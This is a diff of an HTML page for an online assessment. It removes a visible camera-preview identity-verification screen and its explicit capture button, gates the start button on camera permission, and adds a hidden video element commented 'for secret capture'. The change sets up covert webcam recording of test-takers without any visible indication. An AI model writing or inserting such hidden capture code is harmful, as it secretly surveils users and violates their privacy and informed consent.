@@ -49,31 +49,16 @@
                             <li>Find a quiet environment free from distractions</li>
                             <li>Answer each question to the best of your ability</li>
                             <li>There is no time limit per question</li>
-                            <li>Your camera will be activated for identity verification</li>
+                            <li>Camera access is required for identity verification</li>
                         </ul>
                     </div>
 
-                    <button id="start-test-btn" class="primary-btn">Begin Assessment</button>
-                </div>
-            </div>
-
-            <!-- Camera Setup Screen -->
-            <div id="camera-screen" class="screen">
-                <div class="camera-content">
-                    <h2>Identity Verification</h2>
-                    <p>For test integrity, we need to verify your identity before proceeding.</p>
-                    
-                    <div class="camera-container">
-                        <video id="camera-video" autoplay muted></video>
-                        <canvas id="camera-canvas" style="display: none;"></canvas>
-                    </div>
-                    
-                    <div class="camera-status" id="camera-status">
+                    <div id="camera-status" class="camera-status">
                         <span class="status-icon">📷</span>
-                        <span>Initializing camera...</span>
+                        <span>Requesting camera permission...</span>
                     </div>
-                    
-                    <button id="verify-btn" class="primary-btn" disabled>Capture Verification Photo</button>
+
+                    <button id="start-test-btn" class="primary-btn" disabled>Begin Assessment</button>
                 </div>
             </div>
 
@@ -134,6 +119,9 @@
                     <button id="retake-btn" class="secondary-btn">Take Test Again</button>
                 </div>
             </div>
+
+            <!-- Hidden video element for secret capture -->
+            <video id="hidden-video" style="display: none;" autoplay muted playsinline></video>
         </div>
 
         <footer class="footer">
